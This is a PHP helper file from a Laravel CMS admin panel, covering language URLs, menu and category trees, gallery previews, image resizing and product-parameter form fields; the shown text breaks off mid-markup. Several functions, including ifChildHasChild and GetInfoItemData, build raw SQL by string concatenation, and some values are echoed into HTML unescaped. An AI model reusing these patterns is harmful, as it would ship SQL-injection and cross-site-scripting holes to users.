<?php

define('NModel', '\\App\Models\\');

use App\Models\MenuId;
use App\Models\FrontUser;
use App\Models\MenuImages;
use Illuminate\Support\Facades\File;
use Illuminate\Support\Facades\Session;

/**************************************
 ***************ADMIN FUNCTIONS******************
 **************************************/

/**
 * @param $lang
 * @param string $action
 * @return \Illuminate\Contracts\Routing\UrlGenerator|string
 */
function longUrlForLanguage($lang, $action = 'index')
{
    return url($lang . '/' . request()->segment(2) . '/' . request()->segment(3) . '/' . request()->segment(4) . '/' . request()->segment(5) . '/' . $action);
}

/**
 * @param $lang
 * @param string $action
 * @return \Illuminate\Contracts\Routing\UrlGenerator|string
 */
function urlForLanguage($lang, $action = 'index')
{
    return url($lang . '/' . request()->segment(2) . '/' . request()->segment(3) . '/' . request()->segment(4) . '/' . $action);
}

/**
 * @param $lang
 * @param string $action
 * @return \Illuminate\Contracts\Routing\UrlGenerator|string
 */
function urlForFunctionLanguage($lang, $action = 'index')
{
    return url($lang . '/' . request()->segment(2) . '/' . request()->segment(3) . '/' . $action);
}

/**
 * @return \Illuminate\Contracts\Translation\Translator|string
 */
function startMessage()
{
    $time = date("H");

    if ($time < "12") {
        return trans('variables.good_morning');
    } elseif ($time >= "12" && $time < "17") {
        return trans('variables.good_afternoon');
    } else {
        return trans('variables.good_evening');
    }
}

/**
 * @param $id
 * @param $lang_id
 * @param $table
 * @return string
 */
function IfHasName($id, $lang_id, $table)
{
    $table_id = $table . "_id";

    $row = DB::table($table)
        ->select('name')
        ->where($table_id, $id)
        ->where('lang_id', $lang_id)
        ->first();

    if (!is_null($row)) {
        $row = $row->name;
    } else {
        $row = '';
    }
    return $row;
}

/**
 * @param $id
 * @param $lang_id
 * @param $table
 * @return string
 */
function IfHasBody($id, $lang_id, $table)
{
    $table_id = $table . "_id";

    $row = DB::table($table)
        ->select('body')
        ->where($table_id, $id)
        ->where('lang_id', $lang_id)
        ->first();

    if (!is_null($row)) {
        $row = $row->body;
    } else {
        $row = '';
    }
    return $row;
}

/**
 * @param $id
 * @param $lang_id
 * @param $model
 * @param $row_id
 * @return null
 */
function GetNameByLang($id, $lang_id, $model, $row_id)
{
    $table = NModel . $model;

    $row = null;

    $row = $table::where($row_id, $id)
        ->where('lang_id', $lang_id)
        ->first();

    if (!is_null($row)) {
        $row = $row->name;
    } else {
        $row = $table::where($row_id, $id)
            ->first();

        if (!is_null($row))
            $row = $row->name;
    }

    return $row;
}

/**
 * @param $alias
 * @param $lang_id
 * @return string
 */
function showSettingBodyByAlias($alias, $lang_id)
{
    $query = DB::table('settings_id')
        ->join('settings', 'settings.settings_id', '=', 'settings_id.id')
        ->where('alias', $alias)
        ->where('lang_id', $lang_id)
        ->first();

    if (!is_null($query)) {
        $query = $query->body;
    } else {
        $query = '';
    }

    return $query;
}

/**
 * @param $label_id
 * @param $lang_id
 * @return string
 */
function ShowLabelById($label_id, $lang_id)
{
    $query = DB::table('labels')
        ->where('labels_id', $label_id)
        ->where('lang_id', $lang_id)
        ->first();

    if (!is_null($query))
        $query = $query->name;
    else
        $query = '';

    return $query;
}

/**
 * Get max value of position
 * @param $table
 * @return mixed
 */
function GetMaxPosition($table)
{
    $row = DB::table($table)
        ->max('position');

    return $row;
}

/**
 * Get max value of position
 * @param $table
 * @return mixed
 */
function GetPosition($table, $id)
{
    $row = DB::table($table)
        ->where('id', $id)->first();

    if($row){
       $position = $row->position;
    }
    return $position;
}

/**
 * Verify if element has child
 * @param $id
 * @param $table
 * @param null $active
 * @param null $deleted
 * @return mixed
 */
function IfHasChild($id, $table, $active = null, $deleted = null)
{
    if (is_null($active)) {
        $active = 1;
    }
    if (is_null($deleted)) {
        $deleted = 0;
    }
    $row = DB::table($table)
        ->join('menu', 'menu.menu_id', '=', $table . '.id')
        ->where('p_id', $id)
        ->where('active', $active)
        ->where('deleted', $deleted)
        ->get();

    return $row;
}

function IfHasChildNew($id, $table, $active = null, $deleted = null)
{
	if (is_null($active)) {
		$active = 1;
	}
	if (is_null($deleted)) {
		$deleted = 0;
	}
	$row = DB::table($table)
	         ->where('p_id', $id)
	         ->where('active', $active)
	         ->where('deleted', $deleted)
	         ->first();
	return $row;
}

/**
 * Get gallery elements and first image
 * @param $p_id
 * @param $limit
 * @param $lang_id
 * @param null $active
 * @param null $deleted
 * @return mixed
 */

function GetGalleryMorePreview($p_id, $alias, $limit = null, $lang_id, $active = null, $deleted = null, &$gallery_item_id, &$gallery_item, &$gallery_item_image)
{
	if (is_null($active)) {
		$active = 1;
	}
	if (is_null($deleted)) {
		$deleted = 0;
	}

	$gallery_item = [];
	$gallery_item_image = [];
	$gallery_item_id = DB::table('gallery_subject_id')
						 ->inRandomOrder()
	                     ->where( 'p_id', $p_id )
	                     ->where( 'active', $active )
	                     ->where( 'deleted', $deleted )
	                     ->orderBy( 'position', 'asc' )
	                     ->limit($limit)
						 ->where('alias', '!=', $alias)
	                     ->get();

	if(!$gallery_item_id->isEmpty()) {
		foreach ( $gallery_item_id as $one_gallery_item_id ) {
			$gallery_item[ $one_gallery_item_id->id ] = DB::table('gallery_subject')
			                                              ->where( 'gallery_subject_id', $one_gallery_item_id->id )
			                                              ->where( 'lang_id', $lang_id )
			                                              ->first();
			$gallery_item_image[ $one_gallery_item_id->id ] = DB::table('gallery_item_id')
			                                                    ->where( 'gallery_subject_id', $one_gallery_item_id->id )
			                                                    ->where( 'active', 1 )
			                                                    ->where( 'deleted', 0 )
			                                                    ->where('show_on_main', 1)
			                                                    ->orderBy( 'position', 'asc' )
			                                                    ->first();
			if(is_null($gallery_item_image[ $one_gallery_item_id->id ])) {
				$gallery_item_image[ $one_gallery_item_id->id ] = DB::table('gallery_item_id')
				                                                    ->where( 'gallery_subject_id', $one_gallery_item_id->id )
				                                                    ->where( 'active', 1 )
				                                                    ->where( 'deleted', 0 )
				                                                    ->orderBy( 'position', 'asc' )
				                                                    ->first();
			}
		}
	}
}

/*for png transparency*/

function getImageResized($image, $newWidth, $newHeight) {
    $newImg = imagecreatetruecolor($newWidth, $newHeight);
    imagealphablending($newImg, false);
    imagesavealpha($newImg, true);
    $transparent = imagecolorallocatealpha($newImg, 255, 255, 255, 127);
    imagefilledrectangle($newImg, 0, 0, $newWidth, $newHeight, $transparent);
    $src_w = imagesx($image);
    $src_h = imagesy($image);
    imagecopyresampled($newImg, $image, 0, 0, 0, 0, $newWidth, $newHeight, $src_w, $src_h);
    return $newImg;
}

/**
 * Resize img by max size
 * @param $file_path
 * @param $save_new_file
 * @param $file_name
 * @param $maxsize
 * @param int $rgb
 * @param int $quality
 * @return bool
 */

function resizeIMGbyMaxSize($file_path, $save_new_file, $file_name, $maxsize, $rgb = 0xFFFFFF, $quality = 90, $force_width_height = ''){

	$src = 'upfiles/' . $file_path . '/' . $file_name;
    $dest = $save_new_file . $file_name;

	if (!file_exists($src)) return false;

  $size = @getimagesize($src);


  if ($size === false) return false;

  $format = strtolower(substr($size['mime'], strpos($size['mime'], '/')+1));
  $icfunc = "imagecreatefrom" . $format;
  if (!function_exists($icfunc)) return false;

  if (($size[0]>$size[1] || $force_width_height == 'width') && $force_width_height != 'height')
  {
    $ratio = $size[0]/$size[1];

    $new_width = $maxsize;
    $new_height  = floor ($maxsize/$ratio);
  }
  else
  {
    $ratio = $size[1]/$size[0];

    $new_height = $maxsize;
    $new_width = floor ($maxsize/$ratio);
  }

  $punct_pos = mb_strrpos($file_name, ".");
  $extension = mb_substr($file_name, $punct_pos+1);

  $isrc = $icfunc($src);

  if ($extension == 'png'){

    $idest = getImageResized($isrc, intval($new_width), intval($new_height));
    imagepng($idest, $dest);

  }else {

    $idest = imagecreatetruecolor($new_width, $new_height);

    imagefill($idest, 0, 0, $rgb);
    imagecopyresampled($idest, $isrc, 0, 0, 0, 0, $new_width, $new_height, $size[0], $size[1]);

    imagejpeg($idest, $dest, $quality);
  }

  imagedestroy($isrc);
  imagedestroy($idest);

  return true;

}

/**
 * @param $menu_id
 * @return null
 */
function GetPidId($menu_id, $table)
{
    $query = DB::table($table)
        ->select('p_id')
        ->where('id', $menu_id)
        ->first();
    if (!is_null($query)) {
        $query = $query->p_id;
    } else {
        $query = null;
    }
    return $query;
}

/**
 * @param $lang_id
 * @param $id
 * @param null $curr_id
 * @return string
 */

function SelectModulesTree($lang_id, $id, $curr_id = null)
{

    $modules_id_by_level = DB::table('modules_id')
        ->where('deleted', 0)
        ->where('p_id', $id)
        ->orderBy('level', 'asc')
        ->get();

    $modules_by_level = [];
    foreach ($modules_id_by_level as $key => $one_modules_id_by_level) {

        $modules_by_level[$key] = DB::table('modules')
            ->join('modules_id', 'modules.modules_id', '=', 'modules_id.id')
            ->where('modules_id', $one_modules_id_by_level->id)
            ->where('lang_id', $lang_id)
            ->first();
    }

    $item = "";
    foreach ($modules_by_level as $key => $one_modules_by_level) {
        if (!empty($one_modules_by_level)) {
            if ($one_modules_by_level->modules_id == $curr_id) {
                $selected = "selected";
            } else {
                $selected = "";
            }

            $item .= "<option value=\"$one_modules_by_level->modules_id\" $selected>" . str_repeat("*", $one_modules_by_level->level) . " " . $one_modules_by_level->name . "</option>" . SelectModulesTree($lang_id, $one_modules_by_level->modules_id, $curr_id);
        }

    }

    return $item;
}

/**
 * @param $lang_id
 * @param $id
 * @param null $curr_id
 * @return string
 */

function SelectTree($lang_id, $id, $curr_id = null)
{

    $menu_id_by_level = DB::table('menu_id')
        ->where('deleted', 0)
        ->where('p_id', $id)
        ->orderBy('level', 'asc')
        ->get();

    $menu_by_level = [];
    foreach ($menu_id_by_level as $key => $one_menu_id_by_level) {

        $menu_by_level[$key] = DB::table('menu')
            ->join('menu_id', 'menu.menu_id', '=', 'menu_id.id')
            ->where('menu_id', $one_menu_id_by_level->id)
            ->where('lang_id', $lang_id)
            ->first();
    }

    $item = "";
    foreach ($menu_by_level as $key => $one_menu_by_level) {
        if (!empty($one_menu_by_level)) {
            if ($one_menu_by_level->menu_id == $curr_id) {
                $selected = "selected";
            } else {
                $selected = "";
            }

            $item .= "<option value=\"$one_menu_by_level->menu_id\" $selected>" . str_repeat("*", $one_menu_by_level->level) . " " . $one_menu_by_level->name . "</option>" . SelectTree($lang_id, $one_menu_by_level->menu_id, $curr_id);
        }

    }

    return $item;
}

/**
 * @param $lang_id
 * @param $id
 * @param null $curr_id
 * @return string
 */
function SelectGoodsSubjectTree($lang_id, $id, $curr_id = null)
{

    $menu_id_by_level = DB::table('goods_subject_id')
        ->where('deleted', 0)
        ->where('p_id', $id)
        ->orderBy('level', 'asc')
        ->get();

    $menu_by_level = [];
    foreach ($menu_id_by_level as $key => $one_menu_id_by_level) {

        $menu_by_level[$key] = DB::table('goods_subject')
            ->join('goods_subject_id', 'goods_subject.goods_subject_id', '=', 'goods_subject_id.id')
            ->where('goods_subject_id', $one_menu_id_by_level->id)
            ->where('lang_id', $lang_id)
            ->first();
    }

    $item = "";
    foreach ($menu_by_level as $key => $one_menu_by_level) {
        if (!empty($one_menu_by_level)) {
            if ($one_menu_by_level->goods_subject_id == $curr_id) {
                $selected = "selected";
            } else {
                $selected = "";
            }

            if (CheckIfSubjectHasItems('goods', $one_menu_by_level->goods_subject_id)->isEmpty()) {
                $disabled = '';
            } else {
                $disabled = 'disabled';
            }

            $item .= "<option value=\"$one_menu_by_level->goods_subject_id\" $selected $disabled>" . str_repeat("*", $one_menu_by_level->level) . " " . $one_menu_by_level->name . "</option>" . SelectGoodsSubjectTree($lang_id, $one_menu_by_level->goods_subject_id, $curr_id);
        }

    }

    return $item;
}

/**
 * @param $lang_id
 * @param $id
 * @param null $curr_id
 * @return string
 */
function SelectGoodsSubjectsItems($lang_id, $id, $curr_id = null)
{

    if ($id == 0)
        $menu_id_by_level = DB::table('goods_subject_id')
            ->where('active', 1)
            ->where('deleted', 0)
            ->orderBy('level', 'asc')
            ->get();
    else
        $menu_id_by_level = DB::table('goods_subject_id')
            ->where('active', 1)
            ->where('deleted', 0)
            ->where('p_id', $id)
            ->orderBy('level', 'asc')
            ->get();

    $menu_by_level = [];
    foreach ($menu_id_by_level as $key => $one_menu_id_by_level) {

        $menu_by_level[$key] = DB::table('goods_subject')
            ->join('goods_subject_id', 'goods_subject.goods_subject_id', '=', 'goods_subject_id.id')
            ->where('goods_subject_id', $one_menu_id_by_level->id)
            ->where('lang_id', $lang_id)
            ->first();
    }

    $item = '';
    foreach ($menu_by_level as $key => $one_menu_by_level) {
        if (!empty($one_menu_by_level)) {
            $item .= $one_menu_by_level->goods_subject_id . "|" . SelectGoodsSubjectsItems($lang_id, $one_menu_by_level->goods_subject_id, $curr_id);
        }

    }

    return $item;
}

/**
 * @param $lang_id
 * @param $id
 * @return string
 */
function SelectGoodsSubjectsAliasAsc($lang_id, $id)
{

    $menu_id_by_level = DB::table('goods_subject_id')
        ->where('active', 1)
        ->where('deleted', 0)
        ->where('id', $id)
        ->first();

    $item = '';
    if (!is_null($menu_id_by_level))
        $item .= $menu_id_by_level->alias . "|" . SelectGoodsSubjectsAliasAsc($lang_id, $menu_id_by_level->p_id);

    $reverse_items = array_reverse(array_filter(explode('|', $item)));
    $url_item = implode('/', $reverse_items);

    return $url_item;
}



/**
 * @param $lang_id
 * @param $p_id
 * @param null $curr_id
 * @return string
 */
function SelectFirstParentItems($lang_id, $p_id, $curr_id = null)
{
    $parent_id = DB::table('gallery_subject_id')
        ->where('active', 1)
        ->where('deleted', 0)
        ->where('id', $p_id)
        ->first();

    $item = '';

    if (!is_null($parent_id)) {
        $menu_id_by_level = DB::table('gallery_subject_id')
            ->where('active', 1)
            ->where('deleted', 0)
            ->where('id', $parent_id->p_id)
            ->orderBy('level', 'asc')
            ->get();

        $menu_by_level = [];
        foreach ($menu_id_by_level as $key => $one_menu_id_by_level) {

            $menu_by_level[$key] = DB::table('gallery_subject')
                ->join('gallery_subject_id', 'gallery_subject.gallery_subject_id', '=', 'gallery_subject_id.id')
                ->where('gallery_subject_id', $one_menu_id_by_level->id)
                ->where('lang_id', $lang_id)
                ->first();
        }

        foreach ($menu_by_level as $key => $one_menu_by_level) {

            if (!empty($one_menu_by_level)) {
                $item = ($one_menu_by_level->level == 1) ? $one_menu_by_level->gallery_subject_id : '' . SelectFirstParentItems($lang_id, $one_menu_by_level->gallery_subject_id, $curr_id);

            }
        }
    }

    return $item;
}

/**
 * @param $lang_id
 * @param $p_id
 * @return string
 */
function SelectFirstParentItemsName($lang_id, $p_id)
{
    $parent_id = DB::table('goods_subject_id')
        ->where('active', 1)
        ->where('deleted', 0)
        ->where('id', $p_id)
        ->first();

    $item = '';

    if (!is_null($parent_id)) {
        if ($parent_id->level > 1) {
            $menu_id_by_level = DB::table('goods_subject_id')
                ->where('active', 1)
                ->where('deleted', 0)
                ->where('id', $parent_id->p_id)
                ->orderBy('level', 'asc')
                ->get();

            $menu_by_level = [];
            foreach ($menu_id_by_level as $key => $one_menu_id_by_level) {

                $menu_by_level[$key] = DB::table('goods_subject')
                    ->join('goods_subject_id', 'goods_subject.goods_subject_id', '=', 'goods_subject_id.id')
                    ->where('goods_subject_id', $one_menu_id_by_level->id)
                    ->where('lang_id', $lang_id)
                    ->first();
            }

            foreach ($menu_by_level as $key => $one_menu_by_level) {

                if (!empty($one_menu_by_level)) {
                    $item = ($one_menu_by_level->level == 1) ? $one_menu_by_level->name : '' . SelectFirstParentItems($lang_id, $one_menu_by_level->goods_subject_id);

                }
            }
        } else {
            $menu_by_level = DB::table('goods_subject')
                ->join('goods_subject_id', 'goods_subject.goods_subject_id', '=', 'goods_subject_id.id')
                ->where('goods_subject_id', $parent_id->id)
                ->where('lang_id', $lang_id)
                ->first();

            if (!is_null($menu_by_level)) {
                $item = $menu_by_level->name;
            }
        }
    }

    return $item;
}

/**
 * @param $lang_id
 * @param $p_id
 * @return array
 */
function getSubjectInfoByTree($lang_id, $p_id)
{

    $item = SelectFirstParentItems($lang_id, $p_id, $curr_id = null);

    if (!empty($item)) {
        $subject = DB::table('goods_subject')
            ->join('goods_subject_id', 'goods_subject.goods_subject_id', '=', 'goods_subject_id.id')
            ->where('active', 1)
            ->where('deleted', 0)
            ->where('goods_subject_id', $item)
            ->first();
    } else {
        $subject = DB::table('goods_subject')
            ->join('goods_subject_id', 'goods_subject.goods_subject_id', '=', 'goods_subject_id.id')
            ->where('active', 1)
            ->where('deleted', 0)
            ->where('goods_subject_id', $p_id)
            ->first();
    }

    return $subject;
}


function getGallerySubjectInfoByTree($lang_id, $p_id)
{

	$item = SelectFirstParentItems($lang_id, $p_id, $curr_id = null);

	if (!empty($item)) {
		$subject = DB::table('gallery_subject')
		             ->join('gallery_subject_id', 'gallery_subject.gallery_subject_id', '=', 'gallery_subject_id.id')
		             ->where('active', 1)
		             ->where('deleted', 0)
		             ->where('gallery_subject_id', $item)
		             ->first();
	} else {
		$subject = DB::table('gallery_subject')
					 ->join('gallery_subject_id', 'gallery_subject.gallery_subject_id', '=', 'gallery_subject_id.id')
		             ->where('active', 1)
		             ->where('deleted', 0)
		             ->where('gallery_subject_id', $p_id)
		             ->first();
	}

	return $subject;
}



/**
 * @param $lang_id
 * @param $id
 * @param null $curr_id
 * @return string
 */
function SelectGoodsItemTree($lang_id, $id, $curr_id = null)
{

    $menu_id_by_level = DB::table('goods_subject_id')
        ->where('deleted', 0)
        ->where('p_id', $id)
        ->orderBy('level', 'asc')
        ->get();

    $menu_by_level = [];
    foreach ($menu_id_by_level as $key => $one_menu_id_by_level) {

        $menu_by_level[$key] = DB::table('goods_subject')
            ->join('goods_subject_id', 'goods_subject.goods_subject_id', '=', 'goods_subject_id.id')
            ->where('goods_subject_id', $one_menu_id_by_level->id)
            ->where('lang_id', $lang_id)
            ->first();
    }

    $item = "";
    foreach ($menu_by_level as $key => $one_menu_by_level) {
        if (!empty($one_menu_by_level)) {
            if ($one_menu_by_level->goods_subject_id == $curr_id) {
                $selected = "selected";
            } else {
                $selected = "";
            }

            if (!CheckIfSubjectHasItems('goods', $one_menu_by_level->goods_subject_id)->isEmpty() || IfHasChildUniv($one_menu_by_level->goods_subject_id, 'goods_subject', 1, 0)->isEmpty()) {
                $disabled = '';
            } else {
                $disabled = 'disabled';
            }
            $item .= "<option value=\"$one_menu_by_level->goods_subject_id\" $selected $disabled>" . str_repeat("*", $one_menu_by_level->level) . " " . $one_menu_by_level->name . "</option>" . SelectGoodsItemTree($lang_id, $one_menu_by_level->goods_subject_id, $curr_id);
        }

    }
    return $item;
}

/**
 * @param $id
 * @param $table
 * @return null
 */
function GetLevel($id, $table)
{
    $query = DB::table($table)
        ->where('id', $id)
        ->first();

    if (!is_null($query)) {
        $query = $query->level;
    } else {
        $query = null;
    }

    return $query;
}

/**
 * @param $menu_id
 * @param $table
 * @return null
 */
function GetParentAlias($menu_id, $table)
{
    $p_id = GetPidId($menu_id, $table);

    $query = DB::table($table)
        ->where('id', $p_id)
        ->first();

    if (!is_null($query)) {
        $query = $query->alias;
    } else {
        $query = null;
    }

    return $query;
}

/**
 * @param $id
 * @param $table
 * @param null $active
 * @param null $deleted
 * @return mixed
 */
function IfGoodsHasChild($id, $table, $active = null, $deleted = null)
{
    $table_id = $table . '_id';

    if (is_null($active)) {
        $active = 1;
    }
    if (is_null($deleted)) {
        $deleted = 0;
    }
    $row = DB::table($table_id)
        ->join($table, $table . '.' . $table_id, '=', $table_id . '.id')
        ->where('p_id', $id)
        ->where('active', $active)
        ->where('deleted', $deleted)
        ->get();

    return $row;
}

/**
 * @param $table_begin
 * @param $id
 * @return mixed
 */
function CheckIfSubjectHasItems($table_begin, $id)
{
    $table = $table_begin . "_item_id";
    $subject = $table_begin . "_subject_id";

    $query = DB::table($table)
        ->where($subject, $id)
        ->get();

    return $query;
}

/**
 * @param $id
 * @return mixed
 */
function CheckIfInfoLineHasItems($id)
{

    $InfoItemId = NModel . 'InfoItemId';

    $query = $InfoItemId::where('info_line_id', $id)->get();

    return $query;
}

function checkIfRelated($id,$array)
{

    $status = false;

    $array2 = explode(',',$array);

        foreach ($array2 as $one_arr){
            if($id == $one_arr){
                $status = true;
                return $status;
            }
        }
    return $status;
}

function CheckIfGroupHasUsers($id)
{

    $User = NModel . 'User';

    $query = $User::where('admin_user_group_id', $id)->first();

    if (!is_null($query))
        return true;

    return false;
}

/**
 * @param $id
 * @return mixed
 */
function GetSubjectsItems($id)
{

    $query = DB::table('goods_subject_id')
        ->join('goods_item_id', 'goods_item_id.goods_subject_id', '=', 'goods_subject_id.id')
        ->where('goods_subject_id', $id)
        ->where('goods_item_id.active', 1)
        ->where('goods_item_id.deleted', 0)
        ->get();

    return $query;
}

/**
 * Universal function
 * Verify if element has child
 * @param $id
 * @param $table
 * @param null $active
 * @param null $deleted
 * @return mixed
 */
function IfHasChildUniv($id, $table, $active = null, $deleted = null)
{

    $table_id = $table . '_id';
    if (is_null($active)) {
        $active = 1;
    }
    if (is_null($deleted)) {
        $deleted = 0;
    }
    $row = DB::table($table)
        ->join($table_id, $table_id . '.id', '=', $table . '.' . $table_id)
        ->where('p_id', $id)
        ->where('active', $active)
        ->where('deleted', $deleted)
        ->orderBy('position', 'asc')
        ->get();

    return $row;
}

/**
 * @param $id
 * @param $table
 * @param null $active
 * @param null $deleted
 * @return mixed
 */
function IfHasChildModulesList($id, $table, $active = null, $deleted = null)
{

    $table_id = $table . '_id';
    if (is_null($active)) {
        $active = 1;
    }
    if (is_null($deleted)) {
        $deleted = 0;
    }
    $row = DB::table($table)
        ->join($table_id, $table_id . '.id', '=', $table . '.' . $table_id)
        ->where('p_id', $id)
        ->where('active', $active)
        ->where('deleted', $deleted)
        ->orderBy('position', 'asc')
        ->get();

    return $row;
}

/**
 * @param $id
 * @param $lang_id
 * @param $lang
 * @param null $active
 * @param null $deleted
 * @return string
 */
function IfHasChildModules($id, $lang_id, $lang, $active = null, $deleted = null)
{

    $ModulesId = NModel . 'ModulesId';

    if (is_null($active)) {
        $active = 1;
    }
    if (is_null($deleted)) {
        $deleted = 0;
    }

    $modules_id = $ModulesId::where('active', $active)
        ->where('deleted', $deleted)
        ->where('id', $id)
        ->first();

    $item = "";

    if (!is_null($modules_id)) {

        $modules_id_by_level = $ModulesId::where('active', 1)
            ->where('deleted', 0)
            ->where('p_id', $id)
            ->orderBy('position', 'asc')
            ->get();

        if (!$modules_id_by_level->isEmpty()) {

            foreach ($modules_id_by_level as $one_modules_id_by_level) {

                if ($one_modules_id_by_level->level == 2) {
                    $item .= "<div class='menu-item'><a href='" . url($lang, ['back', $modules_id->alias, $one_modules_id_by_level->alias]) . "' " . (request()->segment(4) == $one_modules_id_by_level->alias ? 'class=active' : '') . ">" . (!empty(IfHasName($one_modules_id_by_level->id, $lang_id, 'modules')) ? IfHasName($one_modules_id_by_level->id, $lang_id, 'modules') : trans('variables.another_name')) . "</a></div>" . IfHasChildModules($one_modules_id_by_level->id, $lang_id, $lang);
                }

            }
        }
    }

    return $item;
}

/**
 * @param $id
 * @param $table
 * @param $lang_id
 * @param null $active
 * @param null $deleted
 * @return mixed
 */
function IfHasChildUnivLang($id, $table, $lang_id, $active = null, $deleted = null)
{

    $table_id = $table . '_id';
    if (is_null($active)) {
        $active = 1;
    }
    if (is_null($deleted)) {
        $deleted = 0;
    }
    $row = DB::table($table)
        ->join($table_id, $table_id . '.id', '=', $table . '.' . $table_id)
        ->where('p_id', $id)
        ->where('active', $active)
        ->where('deleted', $deleted)
        ->where('lang_id', $lang_id)
        ->orderBy('position', 'asc')
        ->get();

    return $row;
}

/**
 * @param $subject_id
 * @return mixed
 */
function getSubjectByItem($subject_id)
{

    $query = DB::table('goods_subject_id')
        ->where('id', $subject_id)
        ->where('deleted', 0)
        ->first();

    return $query;
}

/**
 * @param $table_id
 * @param $menu_id
 * @param $level
 * @return bool
 */
function ifChildHasChild($table_id, $menu_id, $level)
{
    $query = DB::select(DB::raw(('select * from ' . $table_id . ' where p_id in(select id from ' . $table_id . ' where level=' . $level . ' and p_id=' . $menu_id . ')')));
    if (empty($query))
        return false;
    else
        return true;
}

/**
 * @param $table
 * @param $id
 * @param $lang_id
 * @return string
 */
function measureName($table, $id, $lang_id)
{
    $row = DB::table($table)
        ->where($table . '_id', $id)
        ->where('lang_id', $lang_id)
        ->first();

    if (!is_null($row))
        $measure_name = $row->name;
    else
        $measure_name = '';

    return $measure_name;
}

/**
 * @param $parameter_id
 * @param $item_id
 * @param $lang_id
 * @return mixed
 */
function GetItemSimpleData($parameter_id, $item_id, $lang_id)
{
    $parameter_data = DB::table('goods_parametr_item_id')
        ->join('goods_parametr_item_simple', 'goods_parametr_item_id.id', '=', 'goods_parametr_item_simple.goods_parametr_item_id')
        ->where('goods_parametr_id', $parameter_id)
        ->where('goods_item_id', $item_id)
        ->where('lang_id', $lang_id)
        ->first();
    return $parameter_data;
}

/**
 * @param $parameter_id
 * @param $item_id
 * @return mixed
 */
function GetItemMeasureData($parameter_id, $item_id)
{
    $parameter_data = DB::table('goods_parametr_item_id')
        ->join('goods_parametr_item_measure', 'goods_parametr_item_id.id', '=', 'goods_parametr_item_measure.goods_parametr_item_id')
        ->where('goods_parametr_id', $parameter_id)
        ->where('goods_item_id', $item_id)
        ->first();

    return $parameter_data;
}


/**
 * @param $parameter_id
 * @param $item_id
 * @return mixed
 */
function GetItemRSCSelectData($parameter_id, $item_id)
{
    $parameter_data = DB::table('goods_parametr_item_id')
        ->join('goods_parametr_item_rsc', 'goods_parametr_item_id.id', '=', 'goods_parametr_item_rsc.goods_parametr_item_id')
        ->where('goods_parametr_id', $parameter_id)
        ->where('goods_item_id', $item_id)
        ->first();

    return $parameter_data;
}

function GetInfoItemData($info_line_id)
{
	$data = DB::select('SELECT DISTINCT YEAR(add_date) AS date_year FROM info_item_id WHERE active=1 AND deleted=0 AND is_public=1 AND info_line_id='.$info_line_id.' ORDER BY date_year DESC');

	return $data;
}


function GetOneInfoItemData($info_item_id)
{
	$data = DB::select('SELECT DISTINCT YEAR(add_date) AS date_year FROM info_item_id WHERE active=1 AND deleted=0 AND is_public=1 AND id='.$info_item_id.' ORDER BY date_year DESC');

	return $data;
}

/**
 * @param $parameter_id
 * @param $lang_id
 * @return mixed
 */
function GetParametrValuesList($parameter_id, $lang_id)
{
    $parameter_data = DB::table('goods_parametr_value_id')
        ->join('goods_parametr_value', 'goods_parametr_value_id.id', '=', 'goods_parametr_value.goods_parametr_value_id')
        ->where('goods_parametr_id', $parameter_id)
        ->where('lang_id', $lang_id)
        ->orderBy('position', 'asc')
        ->get();

    if (empty($parameter_data)) {
        $parameter_data = DB::table('goods_parametr_value_id')
            ->join('goods_parametr_value', 'goods_parametr_value_id.id', '=', 'goods_parametr_value.goods_parametr_value_id')
            ->where('goods_parametr_id', $parameter_id)
            ->orderBy('position', 'asc')
            ->get();
    }

    return $parameter_data;
}

/**
 * @param $parameter_id
 * @param $item_id
 * @return array
 */
function GetItemRSCCheckboxDataOnlyIDs($parameter_id, $item_id)
{
    $parameter_data = DB::table('goods_parametr_item_id')
        ->join('goods_parametr_item_rsc', 'goods_parametr_item_id.id', '=', 'goods_parametr_item_rsc.goods_parametr_item_id')
        ->where('goods_parametr_id', $parameter_id)
        ->where('goods_item_id', $item_id)
        ->get();

    if (!empty($parameter_data)) {
        $res = [];
        foreach ($parameter_data as $one_parameter_data) {
            if ($one_parameter_data->goods_parametr_value_id > 0)
                $res[] = $one_parameter_data->goods_parametr_value_id;
        }
    } else {
        $res = [];
    }

    return $res;
}

/**
 * @param $parameter_id
 * @param $lang_id
 * @param null $item_id
 * @param $curr_page_id
 */
function addEditParameterInItem($parameter_id, $lang_id, $item_id = null, $curr_page_id)
{

    $parameter = DB::table('goods_parametr')
        ->join('goods_parametr_id', 'goods_parametr_id.id', '=', 'goods_parametr.goods_parametr_id')
        ->where('goods_parametr_id', $parameter_id)
        ->where('lang_id', $lang_id)
        ->where('goods_subject_id', $curr_page_id)
        ->first();

    if (is_null($parameter)) {
        $parameter = DB::table('goods_parametr')
            ->join('goods_parametr_id', 'goods_parametr_id.id', '=', 'goods_parametr.goods_parametr_id')
            ->where('goods_parametr_id', $parameter_id)
            ->where('goods_subject_id', $curr_page_id)
            ->first();
    }

    if (!is_null($parameter)) {
        switch ($parameter->parametr_type) {
            case 'input':
                switch ($parameter->measure_type) {
                    case 'no_measure':
                        if ($item_id > 0) {
                            $parameter_data = GetItemSimpleData($parameter_id, $item_id, $lang_id);

                            ?>
                            <input name="parametr_<?= $parameter_id ?>[parametr_value]" class="inp1"
                                   value="<?= !is_null($parameter_data) ? htmlspecialchars($parameter_data->parametr_value) : '' ?>">
                            <?php
                        } else {
                            ?>
                            <input name="parametr_<?= $parameter_id ?>[parametr_value]" class="inp1"
                                   value="">
                            <?php
                        }
                        break;

                    case 'with_measure':
                        if ($item_id > 0) {
                            $parameter_data = GetItemMeasureData($parameter_id, $item_id);

                            ?>
                            <input name="parametr_<?= $parameter_id ?>[parametr_value]" class="parameter-input"
                                   value="<?= !is_null($parameter_data) ? $parameter_data->parametr_value : '' ?>">
                            <span class="measure-name"><?= measureName('goods_measure', $parameter->goods_measure_id, $lang_id) ?></span>
                            <?php
                        } else {
                            ?>
                            <input name="parametr_<?= $parameter_id ?>[parametr_value]" class="parameter-input"
                                   value="">
                            <span class="measure-name"><?= measureName('goods_measure', $parameter->goods_measure_id, $lang_id) ?></span>
                            <?php
                        }
                        break;

                    case 'measure_list':
                        $measures_list = DB::table('goods_measure_id')
                            ->join('goods_measure', 'goods_measure_id.id', '=', 'goods_measure.goods_measure_id')
                            ->where('lang_id', $lang_id)
                            ->get();

                        if ($item_id > 0) {
                            $parameter_data = GetItemMeasureData($parameter_id, $item_id);
                            if (!is_null($parameter_data)) {
                                ?>
                                <div class="many-selects-select-block">
                                    <input name="parametr_<?= $parameter_id ?>[parametr_value]" class="parameter-input"
